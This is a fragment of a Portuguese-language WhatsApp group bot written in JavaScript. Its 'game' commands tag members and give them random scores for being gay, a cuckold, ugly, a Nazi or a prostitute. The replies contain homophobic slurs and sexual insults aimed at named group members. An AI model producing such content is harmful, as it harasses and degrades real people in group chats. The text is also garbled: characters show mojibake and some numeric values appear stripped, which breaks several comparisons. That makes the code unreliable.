gadop = `${Math.floor(Math.random() * 100)}`
const programa = Math.ceil(Math.random() * 10000)
const dptr = `     „Äå üî• ~_*PERFIL*_~ üåà „Äç
üóí *Nome* : *${pushname}*
ü™Ä *N√∫mero* : @${sender.split("@")[0]}
üêÇ *N√≠vel gado* : *${nivelgador}${nivelgado2r}%*
üì± *Seu C√©lular* : ${info.key.id.length > 21 ? 'Android ü§£' : info.key.id.substring(0, 2) == '3A' ? 'IOSüòÇüòÇüòÖ' : 'Zap zap web üòÇüòÇ‚òùüèºüòÖ'}
üòà *N√≠vel puta* : *${putar}${putar2}%*
üòã *N√≠vel de gostosura* : *${gostosurar}${gostosurar2}%*
üçº *Valor do programa* : *R$${programa}*

‚ûª *~_CONSELHO_~* :
${conselho}`
daftarimg = await getBuffer(ppimg)
pl.sendMessage(from, {image: daftarimg, caption: dptr}, {quoted: selo})
break

case 'conselhobiblico':
case 'conselhosbiblico':  
case 'conselhosb':   
case 'conselhob':  
var conselhosb = conselhob[Math.floor(Math.random() * conselhob.length)]   
jr = `${tempo} ${pushname} 

Conselhos B√≠blico para voc√™: 

- ${conselhosb} 

> Bot: ${NomeDoBot}
> Grupo: ${groupName}`
await pl.sendMessage(from, {text: jr}, {quoted:m, contextInfo: {"mentionedJid": jr}})
break

case 'joga-pedra': case 'jogar': {
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(sender))) reply(`Complete seu terno anterior`)
if (m.mentionedJid[0] === sender) return reply(`N√£o brincar com eu  !`)
if (!m.mentionedJid[0]) return reply(`_Quem voc√™ quer desafiar?_\nTag a pessoa..\n\nExemplo : ${prefix}suit @556593065507`)
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return reply(`A pessoa que voc√™ desafiou est√° jogando um jogo com outra pessoa :(`)
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} Desafiador @${m.mentionedJid[0].split`@`[0]} para jogar o jogo

Por favor @${m.mentionedJid[0].split`@`[0]} para digitar aceitar/rejeitar`
this.suit[id] = {
chat: await pl.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) pl.sendText(from, `_O tempo do jogo acabou._`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break

case 'quando': //by: 
if (args.length < 1) return reply('Digite a pergunta')
randomm = meupirul[Math.floor(Math.random() * meupirul.length)]
random2 = `${Math.floor(Math.random() * 11) + 1}`
if (randomm == 'Hoje' || randomm == 'Amanh√£' || randomm == 'Nunca') {
texto = `Pergunta: ${body.slice(1)}\n\nResposta: ${randomm}`
} else if (random2 == 1) {
texto = `Pergunta: ${body.slice(1)}\n\nResposta: 1 ${randomm}`
} else {
random3 = meupirul2[Math.floor(Math.random() * meupirul2.length)]
texto = `Pergunta: ${body.slice(1)}\n\nResposta: ${random2} ${random3}`
}
reply(texto)
break

case 'nick':
case 'gerarnick':
case 'fazernick': 
nick = args.join(' ')
if(!nick) return reply('Escreva o Nick ou nome que voc√™ quer personalizar.')
let anu = await guxtakkkj(nick)
let teks = `üíàNicks Gerados Com Sucesso!üíà\n\n`
var emoji = `üîÆ`
for (let i of anu) {
teks += `${emoji} ${i.result}\n\n`
}
reply(teks)
break

//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\

case 'duelo':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
if (!isGroup) return reply('O comando s√≥ pode ser usado em Grupos.')
if (args.length === 0) return reply(`Modo de usar...\n\n${prefix}duelo @tag / @tag2 / 1 (1 = 1 Minuto)`)
txt = args.join(' ')
nmr = txt.split('/')[0].replace('@' ,  '').replace(' ', '').replace(' ', '').replace(' ', '')
nmr2 = txt.split('/')[1].replace('@' ,  '').replace(' ', '').replace(' ', '').replace(' ', '')
pergunta = 'Qual dos dois duelou melhor ou deu as melhores respostas?'
tempo = txt.split('/')[2]
if(!Number(tempo)) return reply('Ops, insira os minutos\n\n1 = 1 Minuto')

try {
ppimg = await pl.profilePictureUrl(`${nmr}@s.whatsapp.net`)
} catch(erro) {
ppimg = 'https://telegra.ph/file/2fbfa46b4ea3baed434d1.jpg'
}
try {
ppimg2 = await pl.profilePictureUrl(`${nmr2}@s.whatsapp.net`)
} catch(erro) {
ppimg2 = 'https://telegra.ph/file/2fbfa46b4ea3baed434d1.jpg'
}

shortpc = await axios.get(`https://tinyurl.com/api-create.php?url=${ppimg}`)
shortpc2 = await axios.get(`https://tinyurl.com/api-create.php?url=${ppimg2}`)
blup = await getBuffer(`http://api-exteam.herokuapp.com/api/duelo?foto=${shortpc.data}&foto2=${shortpc2.data}`)

await mencionar(blup, `‚öîÔ∏è*Duelo de Stickers*‚öîÔ∏è\n\n@${nmr}  Vs  @${nmr2}\n\nPergunta:  ${pergunta}\n\nDigite:  um = Para votar em:  @${nmr}\nDigite:  dois = Para votar em:  @${nmr2}\n\n‚ö†Ô∏è *Aten√ß√£o*: s√≥ √© permitido votar 1 √∫nica vez, portanto preste aten√ß√£o em quem vai votar, pois n√£o √© poss√≠vel alterar o voto.\n\n‚ùó _N√£o vote por afinidade, vote pela qualidade das respostas, assim voc√™ ajuda a melhorar a qualidade dos duelos..._`, [nmr+'@s.whatsapp.net', nmr2+'@s.whatsapp.net'], true)
addVotoDuelo(from , pergunta , nmr , nmr2 , tempo , reply)
break

//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\   
 

case 'chance': //Jogos
var avb = body.slice(7)
if (args.length < 1) return reply(`Voc√™ precisa digitar da forma correta\nExemplo: /chance do ${pushname} ser um trouxa`)
randomm = `${Math.floor(Math.random() * 100)}`
hasil = `A CHANCE ${body.slice(7)}\n\E DE... ${randomm}%`
let buttons = [
{ buttonId: '‚ù§Ô∏è', buttonText: { displayText: '‚ù§Ô∏è' }, type: 1 }
    ]
await pl.sendButtonText(from, buttons, hasil, pl.user.name, m)
break

case 'gado1':
case 'gadometro':
var chifre = ["ultra extreme gado", "Gado-Master", "Gado-Rei", "Gado", "Escravo-ceta", "Escravo-ceta Maximo", "Gacorno?", "Jogador De Forno Livre<3", "Mestre Do Frifai<3<3", "Gado-Manso", "Gado-Conformado", "Gado-Incubado", "Gado Deus", "Mestre dos Gados", "Topa tudo por buceta", "Gado Comum", "Mini Gadinho", "Gado Iniciante", "Gado Basico", "Gado Intermediario", "Gado Avan√ßado", "Gado Profisional", "Gado Mestre", "Gado Chifrudo", "Corno Conformado", "Corno HiperChifrudo", "Chifrudo Deus", "Mestre dos Chifrudos"]
var gado = chifre[Math.floor(Math.random() * chifre.length)]
gadop = `${Math.floor(Math.random() * 100)}`
hisil = `VOC√ä √â:\n\n${gado}`
reply(hisil)
break

case 'gay1':
if (args.length < 1) return reply('marque o gay do gp!')
rate = body.slice(5)
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
 reply('COMO VOC√ä √â GAY: *'+rate+'*\n\nSUA PORCENTAGEM GAY : '+ kl+'%\n ESSE A√ç AMA D√Å O CU')
break

case 'gay2':
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
 reply(`COMO VOC√ä √â GAY: *${pushname}*\n\nSUA PORCENTAGEM GAY : `+ kl+`%\n VOC√ä AMA D√Å O CU N√â KKK`)
break

case 'pau'://Jogos
randommmm = `${Math.floor(Math.random() * 35)}`
const tamanho = randommmm
if (tamanho < 13 ) {pp = 's√≥ a fimose'} else if (tamanho == 13 ) {pp = 'passou da m√©diaüò≥'} else if (tamanho == 14 ) {pp = 'passou da m√©diaüò≥'} else if (tamanho == 15 ) {pp = 'eita, vai pegar manga?'} else if (tamanho == 16 ) {pp = 'eita, vai pegar manga?'} else if (tamanho == 17 ) {pp = 'calma man, a mina n√£o √© um po√ßoüò≥'} else if (tamanho == 18 ) {pp = 'calma man, a mina n√£o √© um po√ßoüò≥'} else if (tamanho == 19 ) {pp = 'calma man, a mina n√£o √© um po√ßoüò≥'} else if (tamanho == 20 ) {pp = 'voc√™ tem um poste no meio das pernas'} else if (tamanho == 21 ) {pp = 'voc√™ tem um poste no meio das pernas'} else if (tamanho == 22 ) {pp = 'voc√™ tem um poste no meio das pernas'} else if (tamanho == 23 ) {pp = 'voc√™ tem um poste no meio das pernas'} else if (tamanho == 24 ) {pp = 'voc√™ tem um poste no meio das pernas'} else if (tamanho > 25 ) {pp = 'vai procurar petr√≥leo com isso?'
}
hasil = `SEU PAU TEM ${randommmm}CM\n\n${pp}`
reply(hasil)
break

case 'shipo':
teks = args.join(" ")
if(teks.length < 10) return reply('Marque uma pessoa do grupo para encontrar o par dela')
membrr = []
const suamae111 = groupMembers
const suamae211 = groupMembers
const teupai111 = suamae111[Math.floor(Math.random() * suamae111.length)]
const teupai211 = suamae211[Math.floor(Math.random() * suamae211.length)]
var shipted1 = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `100%`]
const shiptedd = shipted1[Math.floor(Math.random() * shipted1.length)]
jet = `*Hmmm.... Eu Shipo eles 2üíòüíò*\n\n1 = @${teupai111.id.split('@')[0]}\n && 2 = ${teks} com uma porcentagem de: ${shiptedd}`
membrr.push(teupai111.id)
membrr.push(teupai211.id)
mentions(jet, membrr, true)
break

case 'casal':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
membr = []
const suamae11 = groupMembers
const suamae21 = groupMembers
const teupai11 = suamae11[Math.floor(Math.random() * suamae11.length)]
const teupai21 = suamae21[Math.floor(Math.random() * suamae21.length)]
var shipted1 = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `100%`]
const shipted = shipted1[Math.floor(Math.random() * shipted1.length)]
jet = `*Hmmm.... Eu Shipo eles 2üíòüíò*\n\n1= @${teupai11.id.split('@')[0]}\ne esse\n2= @${teupai21.id.split('@')[0]}\ncom uma porcentagem de: ${shipted}`
membr.push(teupai11.id)
membr.push(teupai21.id)
mentions(jet, membr, true)
break

case 'alma-gemeas':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
membr = []
const suamae121 = groupMembers
const suamae251 = groupMembers
const teupai117 = suamae121[Math.floor(Math.random() * suamae121.length)]
const teupai251 = suamae251[Math.floor(Math.random() * suamae251.length)]
var shipted11 = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `100%`]
const shipteddd = shipted11[Math.floor(Math.random() * shipted11.length)]
jet = `*Hmmm....  alma-gemeas eles 2 üíòüíò*\n\n1= @${teupai117.id.split('@')[0]}\ne esse\n2= @${teupai251.id.split('@')[0]}\ncom uma porcentagem de: ${shipteddd}`
membr.push(teupai117.id)
membr.push(teupai251.id)
mentions(jet, membr, true)
break


case 'gay':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')

if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

pl.sendMessage(from, {text: `‚ù∞ Pesquisando a sua ficha de gay : @${blamention_id.split("@")[0]} aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imggay}`)
zxzz = 
random = `${Math.floor(Math.random() * 110)}`
feio = random
boiola = random
if (boiola < 20 ) {var bo = 'hmm... voc√™ √© heteroüòî'} else if (boiola == 21 ) {var bo = '+/- boiola'} else if (boiola == 23 ) {var bo = '+/- boiola'} else if (boiola == 24 ) {var bo = '+/- boiola'} else if (boiola == 25 ) {var bo = '+/- boiola'} else if (boiola == 26 ) {var bo = '+/- boiola'} else if (boiola == 27 ) {var bo = '+/- boiola'} else if (boiola == 2 ) {var bo = '+/- boiola'} else if (boiola == 29 ) {var bo = '+/- boiola'} else if (boiola == 30 ) {var bo = '+/- boiola'} else if (boiola == 31 ) {var bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 32 ) {var bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 33 ) {var bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 34 ) {var bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 35 ) {var bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 36 ) {var bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 37 ) {var bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 3 ) {var bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 39 ) {var bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 40 ) {var bo = 'tenho minha desconfian√ßa...üòë'} else if (boiola == 41 ) {var bo = 'voc√™ √© n√©?üòè'} else if (boiola == 42 ) {var bo = 'voc√™ √© n√©?üòè'} else if (boiola == 43 ) {var bo = 'voc√™ √© n√©?üòè'} else if (boiola == 44 ) {var bo = 'voc√™ √© n√©?üòè'} else if (boiola == 45 ) {var bo = 'voc√™ √© n√©?üòè'} else if (boiola == 46 ) {var bo = 'voc√™ √© n√©?üòè'} else if (boiola == 47 ) {var bo = 'voc√™ √© n√©?üòè'} else if (boiola == 4 ) {var bo = 'voc√™ √© n√©?üòè'} else if (boiola == 49 ) {var bo = 'voc√™ √© n√©?üòè'} else if (boiola == 50 ) {var bo = 'voc√™ √© ou n√£o?üßê'} else if (boiola > 51) {var bo = 'voc√™ √© gayüôà'
}
await pl.sendMessage(from, {image: wew, caption: `  O quanto voc√™ √© gay? \n\n „Äå @${blamention_id.split("@")[0]} „ÄçVoc√™ √©: ‚ù∞ ${random}% ‚ù± gay üè≥Ô∏è‚Äçüåà\n\n${bo}`, mentions: [blamention_id], thumbnail:null}, {quoted: m})
}, 7000)
break

case 'feio':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

pl.sendMessage(from, {text: `‚ù∞ Pesquisando a sua ficha de feio : @${blamention_id.split("@")[0]} aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imgfeio}`)
random = `${Math.floor(Math.random() * 110)}`
feio = random
if (feio < 20 ) {var bo = '√â n√£o √© feio'} else if (feio == 21 ) {var bo = '+/- feio'} else if (feio == 23 ) {var bo = '+/- feio'} else if (feio == 24 ) {var bo = '+/- feio'} else if (feio == 25 ) {var bo = '+/- feio'} else if (feio == 26 ) {var bo = '+/- feio'} else if (feio == 27 ) {var bo = '+/- feio'} else if (feio == 2 ) {var bo = '+/- feio'} else if (feio == 29 ) {var bo = '+/- feio'} else if (feio == 30 ) {var bo = '+/- feio'} else if (feio == 31 ) {var bo = 'Ainda t√° na m√©dia'} else if (feio == 32 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if (feio == 33 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if (feio == 34 ) {var bo = '√â fein, mas tem baum cora√ß√£o'} else if (feio == 35 ) {var bo = 'T√° na m√©dia, mas n√£o deixa de ser feii'} else if (feio == 36 ) {var bo = 'Bonitin mas √© feio com orgulho'} else if (feio == 37 ) {var bo = 'Feio e pregui√ßoso(a), vai se arrumar praga feia'} else if (feio == 3 ) {var bo = 'tenho '} else if (feio == 39 ) {var bo = 'Feio, mas um banho E se arrumar, deve resolver'} else if (feio == 40 ) {var bo = 'FeiN,  mas n√£o existe gente feia, existe gente que n√£o conhece os produtos jequity'} else if (feio == 41 ) {var bo = 'voc√™ √© Feio, mas √© legal, continue assim'} else if (feio == 42 ) {var bo = 'Nada que uma maquiagem e se arrumar, que n√£o resolva ü•¥'} else if (feio == 43 ) {var bo = 'Feio que d√≥i de ver, compra uma m√°scara que melhora'} else if (feio == 44 ) {var bo = 'Feio mas nada que um saco na cabe√ßa n√£o resolva n√©!?'} else if (feio == 45 ) {var bo = 'voc√™ √© feio, mas tem bom gosto'} else if (feio == 46 ) {var bo = 'Feio mas tem muitos amigos'} else if (feio == 47 ) {var bo = 'Feio mas tem l√°bia pra pegar v√°rias novinha'} else if (feio == 4 ) {var bo = 'Feio e ainda n√£o sabe se vestir, vixi'} else if (feio == 49 ) {var bo = 'Feiooo'} else if (feio == 50 ) {var bo = 'voc√™ √© Feio, mas n√£o se encherga üßê'} else if (feio > 51) {var bo = 'voc√™ √© Feio demais üôà'} 

await pl.sendMessage(from, {image: wew, caption: `  O quanto voc√™ √© feio? \n\n „Äå @${blamention_id.split("@")[0]} „ÄçVoc√™ √©: ‚ù∞ ${random}% ‚ù± feio üôâ\n\n${bo}`, mentions: [blamention_id], thumbnail:null}, {quoted: m})
}, 7000)
break 

case 'matar':
case 'mata':  
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('marque o alvo que voc√™ quer matar')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Voc√™ Acabou de matar o(a) @${mentioned[0].split('@')[0]} üòàüëπ` 
jrpp = await getBuffer(`${matarcmd}`)
await pl.sendMessage(from, {video: jrpp, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: m})
break 

case 'corno':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
pl.sendMessage(from, {text:` ‚ù∞ Pesquisando a ficha de corno : @${blamention_id.split("@")[0]}, aguarde... ‚ù±`, mentions: [blamention_id]})
setTimeout(async() => {
wew = await getBuffer(`${imgcorno}`)
random = `${Math.floor(Math.random() * 110)}`
await pl.sendMessage(from, {image: wew, caption: ` O quanto voc√™ √© corno? \n\n „Äå @${blamention_id.split("@")[0]} „ÄçVoc√™ √©: ‚ù∞ ${random}% ‚ù±  corno üêÉ`, mentions: [blamention_id]}, {quoted: m})
}, 7000)
break


case 'vesgo':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
pl.sendMessage(from, {text:`‚ù∞ Pesquisando a ficha de vesgo : @${blamention_id.split("@")[0]}, aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imgvesgo}`)
random = `${Math.floor(Math.random() * 110)}`
await pl.sendMessage(from, {image: wew, caption: `O quanto voc√™ √© vesgo? \n\n„Äå @${blamention_id.split("@")[0]} „ÄçVoc√™ √©: ‚ù∞ ${random}% ‚ù±  Vesgo üôÑüòÜ`, mentions: [blamention_id]}, {quoted: m})
}, 7000)
break 

case 'bebado':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
pl.sendMessage(from, {text:`‚ù∞ Pesquisando a ficha de bebado : @${blamention_id.split("@")[0]} , aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imgbebado}`)
random = `${Math.floor(Math.random() * 110)}`
await pl.sendMessage(from, {image: wew, caption:`O quanto voc√™ √© bebado? \n\n„Äå @${blamention_id.split("@")[0]} „ÄçVoc√™ √©: ‚ù∞ ${random}% ‚ù± B√™bado ü§¢ü•µü•¥`, mentions: [blamention_id]}, {quoted: m})
}, 7000)
break 

case 'gado':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
pl.sendMessage(from, {text:`‚ù∞ Pesquisando a ficha de gado : @${blamention_id.split("@")[0]}, aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imggado}`)
random = `${Math.floor(Math.random() * 110)}`
await pl.sendMessage(from, {image: wew, caption: `O quanto voc√™ √© gado? \n\n„Äå @${blamention_id.split("@")[0]} „ÄçVoc√™ √©: ‚ù∞ ${random}% ‚ù±  gado üêÇ`, mentions: [blamention_id]}, {quoted: m})
}, 7000)
break 

case 'gostoso':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
pl.sendMessage(from, {text:` ‚ù∞ Pesquisando a sua ficha de gostoso : @${blamention_id.split("@")[0]} aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imggostoso}`)
random = `${Math.floor(Math.random() * 110)}`
await pl.sendMessage(from, {image: wew, caption: `O quanto voc√™ √© gostoso? üòè\n\n„Äå @${blamention_id.split("@")[0]} „ÄçVoc√™ √©: ‚ù∞ ${random}% ‚ù± gostoso üòù`, gifPlayback: true, mentions: [blamention_id]}, {quoted: m})
}, 7000)
break 

case 'gostosa':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
pl.sendMessage(from, {text:`‚ù∞ Pesquisando a sua ficha de gostosa : @${blamention_id.split("@")[0]} aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imggostosa}`)
random = `${Math.floor(Math.random() * 110)}`
await pl.sendMessage(from, {image: wew, caption: `O quanto voc√™ √© gostosa? üòè\n\n„Äå @${blamention_id.split("@")[0]} „ÄçVoc√™ √©: ‚ù∞ ${random}% ‚ù± gostosa üò≥`, mentions: [blamention_id]}, {quoted: m})
}, 7000)
break


case 'nazista':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')

if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
pl.sendMessage(from, {text: ` ‚ù∞ Pesquisando a sua ficha de nazista : @${blamention_id.split("@")[0]} aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imgnazista}`)
random = `${Math.floor(Math.random() * 110)}`
await pl.sendMessage(from, {image: wew, caption: `O quanto voc√™ √© nazista? \n\n„Äå @${blamention_id.split("@")[0]} „ÄçVoc√™ √©: ‚ù∞ ${random}% ‚ù±  nazista Âçê`, mentions: [blamention_id]}, {quoted: m})
}, 7000)
break 

case 'beijo':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('Marque algu√©m que vc quer da um beijo')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Voc√™ deu um beijo gostoso na(o) @${mentioned[0].split('@')[0]} üòÅüëâüëà‚ù§` 
wew = await getBuffer(`${beijocmd}`)
await pl.sendMessage(from, {video: wew, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: m})
break

case 'tapa':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('marque o alvo que voc√™ quer d√° o tapa')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Voc√™ Acabou de da um tapa na raba daüòè @${mentioned[0].split('@')[0]} üî•` 
jrq = await getBuffer(`${tapacmd}`)
await pl.sendMessage(from, {video: jrq, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: m})
break

case 'chute':
case 'chutar':  
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')

if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('marque o alvo que voc√™ quer d√° um chute')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Voc√™ Acabou de da um chute em @${mentioned[0].split('@')[0]} ü§°` 
jry = await getBuffer(`${chutecmd}`)
await pl.sendMessage(from, {video: jry, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: m})
break 

case 'dogolpe':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')

if (args.length < 1) return await pl.sendMessage(from, {text: 'coloca um nome'}, {quoted: m})
pkt = body.slice(9)
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
random = `${Math.floor(Math.random() * 100)}`
jpr = `*GOLPISTA ENCONTRADOüëâüèª*\n\n*GOLPISTA* : *${args[0]}*\n*PORCENTAGEM DO GOLPE* : ${random}%üòÇ\n\nEle(a) gosta de ferir sentimentos üò¢`
pl.sendMessage(from, {text: jpr, mentions: mentioned})
break


case 'rankgay':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')

try{
d = []
ret = 'üè≥Ô∏è‚Äçüåà Rank dos mais gays\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
ret += `üè≥Ô∏è‚Äçüåà‚ùß @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(ret, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rankgado':
case 'rankgados':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')

try{
d = []
ret = 'üêÇüêÇ Rank dos mais gados do grupo \n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
ret += `üêÇ‚ùß @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(ret, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rankcorno':
case 'rankcornos':
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')

membr = []
const corno1 = groupMembers
const corno2 = groupMembers
const corno3 = groupMembers
const corno4 = groupMembers
const corno5 = groupMembers
const cornos1 = corno1[Math.floor(Math.random() * corno1.length)]
